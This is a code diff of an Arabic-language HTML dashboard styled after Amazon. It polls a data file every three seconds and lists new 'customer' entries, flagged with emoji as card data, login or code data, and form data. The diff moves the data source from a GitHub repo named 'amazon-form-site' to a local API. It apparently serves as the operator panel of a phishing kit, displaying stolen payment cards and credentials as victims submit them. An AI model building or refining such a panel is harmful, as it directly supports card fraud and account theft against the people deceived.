@@ -7,11 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { 
-            font-family: 'Inter', sans-serif; 
-            background: #F3F3F3;
-            min-height: 100vh;
-        }
+        body { font-family: 'Inter', sans-serif; background: #F3F3F3; }
         .data-box {
             background: white;
             border-radius: 16px;
@@ -21,130 +17,55 @@
             border-right: 5px solid #FF9900;
             animation: slideIn 0.3s ease;
         }
-        .data-box:first-child {
-            border-right-color: #FF4500;
-            background: #FFF5F0;
-        }
+        .data-box:first-child { border-right-color: #FF4500; background: #FFF5F0; }
         @keyframes slideIn {
             from { opacity: 0; transform: translateY(-20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .header {
-            background: #131A22;
-            color: white;
-            padding: 20px 24px;
-            border-bottom: 3px solid #FF9900;
-        }
+        .header { background: #131A22; color: white; padding: 20px 24px; border-bottom: 3px solid #FF9900; }
         .refresh-btn {
-            background: #FF9900;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s ease;
+            background: #FF9900; color: white; border: none; padding: 10px 24px;
+            border-radius: 10px; cursor: pointer; font-weight: bold;
         }
-        .refresh-btn:hover {
-            background: #FFB84D;
-            transform: scale(1.05);
-        }
-        .refresh-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
+        .refresh-btn:hover { background: #FFB84D; }
+        .refresh-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .toast {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: #22c55e;
-            color: white;
-            padding: 16px 28px;
-            border-radius: 14px;
-            display: none;
-            z-index: 1000;
-            font-weight: 600;
-            box-shadow: 0 8px 32px rgba(34, 197, 94, 0.3);
+            position: fixed; bottom: 30px; right: 30px; background: #22c55e;
+            color: white; padding: 16px 28px; border-radius: 14px;
+            display: none; z-index: 1000; font-weight: 600;
         }
-        .toast.show {
-            display: block;
-            animation: slideUp 0.5s ease;
-        }
+        .toast.show { display: block; animation: slideUp 0.5s ease; }
         @keyframes slideUp {
             from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .loading {
-            text-align: center;
-            padding: 60px 20px;
-            color: #666;
-        }
+        .loading { text-align: center; padding: 60px 20px; color: #666; }
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #FF9900;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 16px;
+            border: 4px solid #f3f3f3; border-top: 4px solid #FF9900;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 16px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .stat-card {
-            background: white;
-            border-radius: 12px;
-            padding: 12px 20px;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
-        }
+        .stat-card { background: white; border-radius: 12px; padding: 12px 20px; text-align: center; box-shadow: 0 2px 8px rgba(0,0,0,0.04); }
         pre {
-            white-space: pre-wrap;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 1.8;
-            background: #f9f9f9;
-            padding: 16px;
-            border-radius: 8px;
-            direction: ltr;
-            text-align: left;
-            color: #333;
+            white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 14px;
+            line-height: 1.8; background: #f9f9f9; padding: 16px; border-radius: 8px;
+            direction: ltr; text-align: left; color: #333;
         }
-        .error-box {
-            background: #fef2f2;
-            border: 2px solid #fca5a5;
-            border-radius: 16px;
-            padding: 30px;
-            text-align: center;
-        }
+        .error-box { background: #fef2f2; border: 2px solid #fca5a5; border-radius: 16px; padding: 30px; text-align: center; }
         .entry-number {
-            display: inline-block;
-            background: #FF9900;
-            color: white;
-            padding: 2px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
+            display: inline-block; background: #FF9900; color: white;
+            padding: 2px 12px; border-radius: 20px; font-size: 12px; font-weight: bold;
         }
         .live-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #22c55e;
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-            margin-right: 6px;
+            display: inline-block; width: 8px; height: 8px; background: #22c55e;
+            border-radius: 50%; animation: pulse 1.5s infinite; margin-right: 6px;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .time-badge {
-            font-size: 12px;
-            color: #999;
-        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .time-badge { font-size: 12px; color: #999; }
     </style>
 </head>
 <body>
@@ -159,24 +80,11 @@
     </div>
 
     <main class="max-w-5xl mx-auto p-4 md:p-6">
-
         <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
-            <div class="stat-card">
-                <div class="text-2xl font-bold text-[#FF9900]" id="totalEntries">0</div>
-                <div class="text-xs text-gray-500">عدد الإدخالات</div>
-            </div>
-            <div class="stat-card">
-                <div class="text-2xl font-bold text-green-600" id="lastEntryTime">--</div>
-                <div class="text-xs text-gray-500">آخر إدخال</div>
-            </div>
-            <div class="stat-card">
-                <div class="text-2xl font-bold text-blue-600" id="todayEntries">0</div>
-                <div class="text-xs text-gray-500">اليوم</div>
-            </div>
-            <div class="stat-card">
-                <div class="text-2xl font-bold" id="statusBadge">🟢</div>
-                <div class="text-xs text-gray-500">الحالة</div>
-            </div>
+            <div class="stat-card"><div class="text-2xl font-bold text-[#FF9900]" id="totalEntries">0</div><div class="text-xs text-gray-500">عدد الإدخالات</div></div>
+            <div class="stat-card"><div class="text-2xl font-bold text-green-600" id="lastEntryTime">--</div><div class="text-xs text-gray-500">آخر إدخال</div></div>
+            <div class="stat-card"><div class="text-2xl font-bold text-blue-600" id="todayEntries">0</div><div class="text-xs text-gray-500">اليوم</div></div>
+            <div class="stat-card"><div class="text-2xl font-bold" id="statusBadge">🟢</div><div class="text-xs text-gray-500">الحالة</div></div>
         </div>
 
         <div class="flex justify-between items-center mb-4">
@@ -184,23 +92,14 @@
             <span class="text-sm text-gray-400" id="lastUpdate">آخر تحديث: --</span>
         </div>
 
-        <div id="dataContainer">
-            <div class="loading">
-                <div class="spinner"></div>
-                <p>جاري تحميل البيانات...</p>
-            </div>
-        </div>
+        <div id="dataContainer"><div class="loading"><div class="spinner"></div><p>جاري تحميل البيانات...</p></div></div>
     </main>
 
     <div id="toast" class="toast">✅ بيانات جديدة وصلت!</div>
 
     <script>
         let lastData = '';
-        let notificationCount = 0;
         let isLoading = false;
-
-        // رابط البيانات الخام من GitHub
-        const DATA_URL = 'https://raw.githubusercontent.com/afffaaaa28-glitch/amazon-form-site/main/data.txt';
 
         async function fetchData() {
             if (isLoading) return;
@@ -211,44 +110,25 @@
             btn.textContent = '⏳ جاري...';
             
             try {
-                // استخدام Proxy عشان نتجاوز مشكلة CORS
-                const response = await fetch(DATA_URL + '?t=' + Date.now(), {
-                    cache: 'no-store',
-                    headers: {
-                        'Cache-Control': 'no-cache, no-store, must-revalidate'
-                    }
-                });
-                
-                if (!response.ok) {
-                    throw new Error('HTTP ' + response.status);
-                }
-                
+                const response = await fetch('/api/data?t=' + Date.now());
                 const data = await response.text();
-                console.log('📊 تم جلب البيانات، الطول:', data.length);
                 
                 if (data !== lastData) {
                     lastData = data;
                     displayData(data);
-                    if (data.trim()) {
-                        showNotification();
-                    }
+                    if (data.trim()) { showNotification(); }
                 }
                 
                 document.getElementById('lastUpdate').textContent = `آخر تحديث: ${new Date().toLocaleTimeString('ar-EG')}`;
                 updateStats(data);
                 document.getElementById('statusBadge').textContent = '🟢';
-                
             } catch (error) {
-                console.error('❌ خطأ:', error);
                 document.getElementById('dataContainer').innerHTML = `
                     <div class="error-box">
                         <div class="text-4xl mb-3">⚠️</div>
                         <h3 class="font-bold text-lg text-red-700">خطأ في جلب البيانات</h3>
                         <p class="text-sm text-gray-600 mt-2">${error.message}</p>
-                        <p class="text-xs text-gray-400 mt-4">تأكد من اتصال الإنترنت</p>
-                        <button onclick="fetchData()" class="mt-4 bg-[#FF9900] text-white px-6 py-2 rounded-lg hover:bg-[#FFB84D]">
-                            🔄 إعادة المحاولة
-                        </button>
+                        <button onclick="fetchData()" class="mt-4 bg-[#FF9900] text-white px-6 py-2 rounded-lg">🔄 إعادة المحاولة</button>
                     </div>
                 `;
                 document.getElementById('statusBadge').textContent = '🔴';
@@ -261,126 +141,62 @@
 
         function displayData(data) {
             const container = document.getElementById('dataContainer');
-            
             if (!data || data.trim() === '') {
-                container.innerHTML = `
-                    <div class="bg-white rounded-2xl p-12 text-center shadow-sm">
-                        <div class="text-6xl mb-4">📭</div>
-                        <h3 class="text-2xl font-bold text-gray-700 mb-2">لا توجد بيانات</h3>
-                        <p class="text-gray-400">انتظر وصول أول عميل...</p>
-                    </div>
-                `;
+                container.innerHTML = `<div class="bg-white rounded-2xl p-12 text-center"><div class="text-6xl mb-4">📭</div><h3 class="text-2xl font-bold text-gray-700">لا توجد بيانات</h3></div>`;
                 return;
             }
 
-            // تقسيم البيانات
             const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
-            const reversedSections = sections.reverse();
-            
+            const reversed = sections.reverse();
             let html = '';
-            let entryCount = sections.length;
+            let count = sections.length;
             
-            reversedSections.forEach((section, index) => {
-                const entryNumber = entryCount - index;
+            reversed.forEach((section, i) => {
+                const num = count - i;
                 let title = '📝 بيانات جديدة';
-                const titleMatch = section.match(/📋.*|💳.*|🔐.*/);
-                if (titleMatch) {
-                    title = titleMatch[0];
-                }
+                const tMatch = section.match(/📋.*|💳.*|🔐.*/);
+                if (tMatch) title = tMatch[0];
                 
                 let content = section.replace(/^={50,}\n/, '').replace(/\n={50,}$/, '');
-                
                 let time = '';
-                const timeMatch = section.match(/🕐 الوقت: (.+)/);
-                if (timeMatch) {
-                    time = timeMatch[1];
-                }
+                const tm = section.match(/🕐 الوقت: (.+)/);
+                if (tm) time = tm[1];
                 
-                let borderColor = '#FF9900';
-                let bgColor = '#FFF8F0';
-                if (title.includes('💳')) {
-                    borderColor = '#22c55e';
-                    bgColor = '#F0FFF4';
-                } else if (title.includes('🔐')) {
-                    borderColor = '#8b5cf6';
-                    bgColor = '#F5F0FF';
-                } else if (title.includes('📋')) {
-                    borderColor = '#FF4500';
-                    bgColor = '#FFF5F0';
-                }
+                let color = '#FF9900', bg = '#FFF8F0';
+                if (title.includes('💳')) { color = '#22c55e'; bg = '#F0FFF4'; }
+                else if (title.includes('🔐')) { color = '#8b5cf6'; bg = '#F5F0FF'; }
+                else if (title.includes('📋')) { color = '#FF4500'; bg = '#FFF5F0'; }
                 
-                html += `
-                    <div class="data-box" style="border-right-color: ${borderColor}; background: ${bgColor};">
-                        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;">
-                            <span class="entry-number">#${entryNumber}</span>
-                            <span class="text-sm font-bold" style="color: ${borderColor};">${title}</span>
-                            ${time ? `<span class="time-badge">🕐 ${time}</span>` : ''}
-                        </div>
-                        <pre style="margin-top: 12px;">${content}</pre>
+                html += `<div class="data-box" style="border-right-color:${color};background:${bg};">
+                    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
+                        <span class="entry-number">#${num}</span>
+                        <span class="text-sm font-bold" style="color:${color};">${title}</span>
+                        ${time ? `<span class="time-badge">🕐 ${time}</span>` : ''}
                     </div>
-                `;
+                    <pre style="margin-top:12px;">${content}</pre>
+                </div>`;
             });
-
             container.innerHTML = html;
         }
 
         function updateStats(data) {
-            if (!data || data.trim() === '') {
-                document.getElementById('totalEntries').textContent = '0';
-                return;
-            }
-            
+            if (!data || data.trim() === '') { document.getElementById('totalEntries').textContent = '0'; return; }
             const sections = data.split(/\n={50,}\n/).filter(s => s.trim());
             document.getElementById('totalEntries').textContent = sections.length || 0;
-            
             if (sections.length > 0) {
-                const lastSection = sections[sections.length - 1];
-                const timeMatch = lastSection.match(/🕐 الوقت: (.+)/);
-                if (timeMatch) {
-                    document.getElementById('lastEntryTime').textContent = timeMatch[1];
-                }
+                const tm = sections[sections.length-1].match(/🕐 الوقت: (.+)/);
+                if (tm) document.getElementById('lastEntryTime').textContent = tm[1];
             }
-            
-            const today = new Date().toLocaleDateString('ar-EG');
-            let todayCount = 0;
-            sections.forEach(s => {
-                if (s.includes(today)) todayCount++;
-            });
-            document.getElementById('todayEntries').textContent = todayCount;
         }
 
         function showNotification() {
             const toast = document.getElementById('toast');
             toast.classList.add('show');
-            
-            notificationCount++;
-            
-            try {
-                if ('Notification' in window && Notification.permission === 'granted') {
-                    new Notification('📬 بيانات جديدة وصلت!', {
-                        body: 'تم استلام بيانات جديدة من العميل',
-                        icon: '🔔'
-                    });
-                }
-            } catch (e) {}
-            
-            setTimeout(() => {
-                toast.classList.remove('show');
-            }, 4000);
+            setTimeout(() => toast.classList.remove('show'), 4000);
         }
 
-        try {
-            if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission();
-            }
-        } catch (e) {}
-
-        // التحميل الأول
         fetchData();
-
-        // التحديث كل 3 ثواني
         setInterval(fetchData, 3000);
     </script>
-
 </body>
 </html>
